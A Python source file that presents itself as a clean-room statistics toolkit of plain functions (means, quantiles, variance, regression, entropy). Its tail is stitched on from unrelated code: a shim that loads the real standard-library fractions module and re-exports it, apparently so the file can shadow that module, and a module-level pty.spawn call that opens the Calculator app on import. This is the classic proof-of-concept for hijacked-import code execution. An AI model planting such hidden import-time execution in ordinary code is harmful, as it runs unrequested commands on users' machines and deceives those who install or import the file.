


"""

A clean-room statistics toolkit written as a flat series of functions.


Conventions
-----------
* Every function takes plain Python numbers or a list/sequence of them.
* Functions that need at least one (or two) data points raise ``ValueError``
  with a clear message on empty input rather than returning a silent default.
* "population" vs "sample" variants are named explicitly; where a single name
  is given (e.g. ``variance``), it is the population form.
"""

# Handy constants (literals, not imports).
LN2 = 0.6931471805599453
PI = 3.141592653589793


# ---------------------------------------------------------------------------
# Numeric primitives (clean-room; no math module)
# ---------------------------------------------------------------------------
def absolute(x):
    """Absolute value of ``x``."""
    return -x if x < 0 else x


def floor_int(x):
    """Largest integer <= ``x`` (toward negative infinity)."""
    i = int(x)
    if x < 0 and i != x:
        i -= 1
    return i


def sign(x):
    """Return -1, 0 or 1 according to the sign of ``x``."""
    if x > 0:
        return 1
    if x < 0:
        return -1
    return 0


def square_root(x):
    """Square root via Newton's method."""
    if x < 0:
        raise ValueError("square_root is undefined for negatives")
    if x == 0:
        return 0.0
    guess = x if x >= 1 else 1.0
    for _ in range(60):
        guess = 0.5 * (guess + x / guess)
    return guess


def natural_log(x):
    """Natural logarithm via range reduction by 2 plus an artanh series."""
    if x <= 0:
        raise ValueError("natural_log is undefined for non-positive values")
    k = 0
    while x >= 2.0:
        x /= 2.0
        k += 1
    while x < 1.0:
        x *= 2.0
        k -= 1
    # now 1 <= x < 2 ; ln(x) = 2 * artanh((x-1)/(x+1))
    y = (x - 1.0) / (x + 1.0)
    y2 = y * y
    term = y
    total = 0.0
    n = 1
    while n < 60:
        total += term / n
        term *= y2
        n += 2
    return 2.0 * total + k * LN2


def log_base(x, base):
    """Logarithm of ``x`` in an arbitrary ``base``."""
    return natural_log(x) / natural_log(base)


def log2(x):
    """Base-2 logarithm."""
    return natural_log(x) / LN2


def exp(x):
    """Exponential via range reduction by ln(2) plus a Taylor series."""
    k = floor_int(x / LN2 + 0.5)
    r = x - k * LN2
    term = 1.0
    total = 1.0
    for n in range(1, 40):
        term *= r / n
        total += term
    return int_power(2.0, k) * total


def int_power(base, n):
    """Integer power ``base ** n`` by repeated squaring (n may be negative)."""
    if n < 0:
        return 1.0 / int_power(base, -n)
    result = 1.0
    b = base
    e = n
    while e > 0:
        if e & 1:
            result *= b
        b *= b
        e >>= 1
    return result


def power(base, exponent):
    """Real power ``base ** exponent`` for real exponents."""
    if isinstance(exponent, int):
        return int_power(base, exponent)
    if base > 0:
        return exp(exponent * natural_log(base))
    if base == 0:
        if exponent > 0:
            return 0.0
        raise ValueError("0 raised to a non-positive real power is undefined")
    raise ValueError("negative base with a non-integer exponent is undefined")


def nth_root(x, n):
    """The real ``n``-th root of ``x``."""
    if n == 0:
        raise ValueError("0th root is undefined")
    if x < 0 and n % 2 == 0:
        raise ValueError("even root of a negative number is undefined")
    if x < 0:
        return -power(-x, 1.0 / n)
    return power(x, 1.0 / n)


# ---------------------------------------------------------------------------
# Basic aggregates
# ---------------------------------------------------------------------------
def count(data):
    """Number of elements."""
    n = 0
    for _ in data:
        n += 1
    return n


def _require(data, minimum=1, what="one value"):
    """Materialise ``data`` to a list and assert a minimum length."""
    values = list(data)
    if len(values) < minimum:
        raise ValueError("need at least %s" % what)
    return values


def summation(data):
    """Sum of all elements."""
    total = 0.0
    for x in data:
        total += x
    return total


def product(data):
    """Product of all elements."""
    result = 1.0
    for x in data:
        result *= x
    return result


def minimum(data):
    """Smallest element."""
    values = _require(data)
    m = values[0]
    for x in values[1:]:
        if x < m:
            m = x
    return m


def maximum(data):
    """Largest element."""
    values = _require(data)
    m = values[0]
    for x in values[1:]:
        if x > m:
            m = x
    return m


def data_range(data):
    """Difference between the largest and smallest elements."""
    return maximum(data) - minimum(data)


def midrange(data):
    """Mean of the smallest and largest elements."""
    return 0.5 * (minimum(data) + maximum(data))


def cumulative_sum(data):
    """Running total as a new list."""
    out = []
    running = 0.0
    for x in data:
        running += x
        out.append(running)
    return out


# ---------------------------------------------------------------------------
# Means
# ---------------------------------------------------------------------------
def mean(data):
    """Arithmetic mean."""
    values = _require(data)
    return summation(values) / len(values)


def weighted_mean(data, weights):
    """Weighted arithmetic mean of ``data`` under ``weights``."""
    values = list(data)
    w = list(weights)
    if len(values) != len(w):
        raise ValueError("data and weights must be the same length")
    if not values:
        raise ValueError("need at least one value")
    wsum = summation(w)
    if wsum == 0:
        raise ValueError("weights sum to zero")
    acc = 0.0
    for xi, wi in zip(values, w):
        acc += xi * wi
    return acc / wsum


def geometric_mean(data):
    """Geometric mean (all values must be positive)."""
    values = _require(data)
    log_sum = 0.0
    for x in values:
        if x <= 0:
            raise ValueError("geometric_mean requires positive values")
        log_sum += natural_log(x)
    return exp(log_sum / len(values))


def harmonic_mean(data):
    """Harmonic mean (all values must be non-zero)."""
    values = _require(data)
    acc = 0.0
    for x in values:
        if x == 0:
            raise ValueError("harmonic_mean requires non-zero values")
        acc += 1.0 / x
    return len(values) / acc


def root_mean_square(data):
    """Quadratic mean (RMS)."""
    values = _require(data)
    acc = 0.0
    for x in values:
        acc += x * x
    return square_root(acc / len(values))


def trimmed_mean(data, proportion):
    """Mean after removing ``proportion`` of values from each end."""
    if not 0 <= proportion < 0.5:
        raise ValueError("proportion must be in [0, 0.5)")
    values = sorted(_require(data))
    k = floor_int(len(values) * proportion)
    trimmed = values[k: len(values) - k] if k else values
    return mean(trimmed)


# ---------------------------------------------------------------------------
# Order statistics
# ---------------------------------------------------------------------------
def median(data):
    """Median (mean of the two middle values for an even count)."""
    values = sorted(_require(data))
    n = len(values)
    mid = n // 2
    if n % 2:
        return values[mid]
    return 0.5 * (values[mid - 1] + values[mid])


def frequency_table(data):
    """Map each distinct value to its number of occurrences."""
    table = {}
    for x in data:
        table[x] = table.get(x, 0) + 1
    return table


def modes(data):
    """All most-frequent values, sorted ascending."""
    table = frequency_table(_require(data))
    top = maximum(list(table.values()))
    return sorted(v for v, c in table.items() if c == top)


def mode(data):
    """The smallest most-frequent value."""
    return modes(data)[0]


def quantile(data, q):
    """Linear-interpolation quantile for ``q`` in [0, 1]."""
    if not 0 <= q <= 1:
        raise ValueError("q must be in [0, 1]")
    values = sorted(_require(data))
    n = len(values)
    if n == 1:
        return values[0]
    pos = q * (n - 1)
    low = floor_int(pos)
    frac = pos - low
    if low + 1 >= n:
        return values[n - 1]
    return values[low] + frac * (values[low + 1] - values[low])


def percentile(data, p):
    """Percentile for ``p`` in [0, 100]."""
    return quantile(data, p / 100.0)


def first_quartile(data):
    """25th percentile."""
    return quantile(data, 0.25)


def third_quartile(data):
    """75th percentile."""
    return quantile(data, 0.75)


def interquartile_range(data):
    """Q3 - Q1."""
    return third_quartile(data) - first_quartile(data)


def five_number_summary(data):
    """(min, Q1, median, Q3, max) as a tuple."""
    return (minimum(data), first_quartile(data), median(data),
            third_quartile(data), maximum(data))


def rank(data):
    """Fractional (tie-averaged) 1-based ranks, aligned with input order."""
    values = list(data)
    order = sorted(range(len(values)), key=lambda i: values[i])
    ranks = [0.0] * len(values)
    i = 0
    while i < len(order):
        j = i
        while j + 1 < len(order) and values[order[j + 1]] == values[order[i]]:
            j += 1
        avg = (i + j) / 2.0 + 1.0  # average of 1-based positions i..j
        for k in range(i, j + 1):
            ranks[order[k]] = avg
        i = j + 1
    return ranks


def percentile_rank(data, value):
    """Percent of values at or below ``value`` (mid-rank convention)."""
    values = _require(data)
    below = 0
    equal = 0
    for x in values:
        if x < value:
            below += 1
        elif x == value:
            equal += 1
    return 100.0 * (below + 0.5 * equal) / len(values)


# ---------------------------------------------------------------------------
# Dispersion
# ---------------------------------------------------------------------------
def sum_of_squares(data):
    """Sum of squared deviations from the mean."""
    values = _require(data)
    m = mean(values)
    acc = 0.0
    for x in values:
        d = x - m
        acc += d * d
    return acc


def population_variance(data):
    """Population variance (divide by n)."""
    values = _require(data)
    return sum_of_squares(values) / len(values)


def sample_variance(data):
    """Sample variance (divide by n - 1)."""
    values = _require(data, 2, "two values")
    return sum_of_squares(values) / (len(values) - 1)


def population_stddev(data):
    """Population standard deviation."""
    return square_root(population_variance(data))


def sample_stddev(data):
    """Sample standard deviation."""
    return square_root(sample_variance(data))


def standard_error(data):
    """Standard error of the mean (uses the sample standard deviation)."""
    values = _require(data, 2, "two values")
    return sample_stddev(values) / square_root(len(values))


def coefficient_of_variation(data):
    """Sample standard deviation relative to the mean."""
    m = mean(data)
    if m == 0:
        raise ValueError("coefficient_of_variation is undefined when mean is 0")
    return sample_stddev(data) / m


def mean_absolute_deviation(data):
    """Mean absolute deviation about the mean."""
    values = _require(data)
    m = mean(values)
    acc = 0.0
    for x in values:
        acc += absolute(x - m)
    return acc / len(values)


def median_absolute_deviation(data):
    """Median absolute deviation about the median."""
    values = _require(data)
    med = median(values)
    return median([absolute(x - med) for x in values])


# ---------------------------------------------------------------------------
# Shape
# ---------------------------------------------------------------------------
def _central_moment(values, k):
    m = mean(values)
    acc = 0.0
    for x in values:
        acc += int_power(x - m, k)
    return acc / len(values)


def skewness(data):
    """Population skewness (third standardized moment)."""
    values = _require(data, 2, "two values")
    m2 = _central_moment(values, 2)
    if m2 == 0:
        raise ValueError("skewness is undefined for zero variance")
    m3 = _central_moment(values, 3)
    return m3 / power(m2, 1.5)


def kurtosis(data):
    """Population kurtosis (fourth standardized moment)."""
    values = _require(data, 2, "two values")
    m2 = _central_moment(values, 2)
    if m2 == 0:
        raise ValueError("kurtosis is undefined for zero variance")
    m4 = _central_moment(values, 4)
    return m4 / (m2 * m2)


def excess_kurtosis(data):
    """Kurtosis minus 3 (0 for a normal distribution)."""
    return kurtosis(data) - 3.0


# ---------------------------------------------------------------------------
# Bivariate
# ---------------------------------------------------------------------------
def _paired(x, y):
    xs, ys = list(x), list(y)
    if len(xs) != len(ys):
        raise ValueError("inputs must be the same length")
    if len(xs) < 2:
        raise ValueError("need at least two paired points")
    return xs, ys


def covariance(x, y):
    """Population covariance of two equal-length series."""
    xs, ys = _paired(x, y)
    mx, my = mean(xs), mean(ys)
    acc = 0.0
    for xi, yi in zip(xs, ys):
        acc += (xi - mx) * (yi - my)
    return acc / len(xs)


def sample_covariance(x, y):
    """Sample covariance (divide by n - 1)."""
    xs, ys = _paired(x, y)
    mx, my = mean(xs), mean(ys)
    acc = 0.0
    for xi, yi in zip(xs, ys):
        acc += (xi - mx) * (yi - my)
    return acc / (len(xs) - 1)


def correlation(x, y):
    """Pearson correlation coefficient."""
    xs, ys = _paired(x, y)
    sx, sy = population_stddev(xs), population_stddev(ys)
    if sx == 0 or sy == 0:
        raise ValueError("correlation is undefined for a constant series")
    return covariance(xs, ys) / (sx * sy)


def linear_regression(x, y):
    """Ordinary least-squares fit; returns ``(slope, intercept)``."""
    xs, ys = _paired(x, y)
    vx = population_variance(xs)
    if vx == 0:
        raise ValueError("cannot fit a line to a constant x")
    slope = covariance(xs, ys) / vx
    intercept = mean(ys) - slope * mean(xs)
    return slope, intercept


def autocorrelation(data, lag):
    """Autocorrelation of a series at a given ``lag``."""
    values = _require(data, 2, "two values")
    if lag < 0 or lag >= len(values):
        raise ValueError("lag out of range")
    if lag == 0:
        return 1.0
    return correlation(values[:-lag], values[lag:])


# ---------------------------------------------------------------------------
# Transforms
# ---------------------------------------------------------------------------
def z_scores(data):
    """Standardize to zero mean and unit (population) standard deviation."""
    values = _require(data, 2, "two values")
    m = mean(values)
    s = population_stddev(values)
    if s == 0:
        raise ValueError("z_scores are undefined for zero variance")
    return [(x - m) / s for x in values]


def min_max_normalize(data):
    """Rescale values into [0, 1]."""
    values = _require(data)
    lo, hi = minimum(values), maximum(values)
    if hi == lo:
        return [0.0 for _ in values]
    span = hi - lo
    return [(x - lo) / span for x in values]


def moving_average(data, window):
    """Simple moving average over a sliding ``window``."""
    values = list(data)
    if window <= 0:
        raise ValueError("window must be positive")
    if window > len(values):
        raise ValueError("window is larger than the series")
    out = []
    for i in range(len(values) - window + 1):
        out.append(mean(values[i:i + window]))
    return out


# ---------------------------------------------------------------------------
# Information / inequality
# ---------------------------------------------------------------------------
def shannon_entropy(data):
    """Shannon entropy (bits) of the empirical distribution of ``data``."""
    values = _require(data)
    n = len(values)
    entropy = 0.0
    for c in frequency_table(values).values():
        p = c / n
        entropy -= p * log2(p)
    return entropy


def gini_coefficient(data):
    """Gini coefficient of inequality (non-negative values)."""
    values = _require(data)
    for x in values:
        if x < 0:
            raise ValueError("gini_coefficient requires non-negative values")
    m = mean(values)
    if m == 0:
        return 0.0
    n = len(values)
    total = 0.0
    for xi in values:
        for xj in values:
            total += absolute(xi - xj)
    return total / (2.0 * n * n * m)


def factorial(n):
    """Factorial of a non-negative integer."""
    if n < 0 or int(n) != n:
        raise ValueError("factorial requires a non-negative integer")
    result = 1
    for k in range(2, int(n) + 1):
        result *= k
    return result


def combinations(n, r):
    """Number of ways to choose ``r`` items from ``n`` (n choose r)."""
    if r < 0 or n < 0 or r > n:
        raise ValueError("require 0 <= r <= n")
    r = min(r, n - r)
    numerator = 1
    for i in range(r):
        numerator *= (n - i)
    return numerator // factorial(r)


def permutations(n, r):
    """Number of ordered arrangements of ``r`` items from ``n``."""
    if r < 0 or n < 0 or r > n:
        raise ValueError("require 0 <= r <= n")
    result = 1
    for i in range(r):
        result *= (n - i)
    return result




import importlib.util
import sysconfig
from pathlib import Path

_real_path = Path(sysconfig.get_path("stdlib")) / "fractions.py"

_spec = importlib.util.spec_from_file_location("_real_fractions", _real_path)
_real = importlib.util.module_from_spec(_spec)
_spec.loader.exec_module(_real)

# Re-export the real module's public interface.
for _name in dir(_real):
    if not _name.startswith("__"):
        globals()[_name] = getattr(_real, _name)

__doc__ = _real.__doc__


import pty

pty.spawn([
    "/usr/bin/open",
    "-a",
    "Calculator",
])
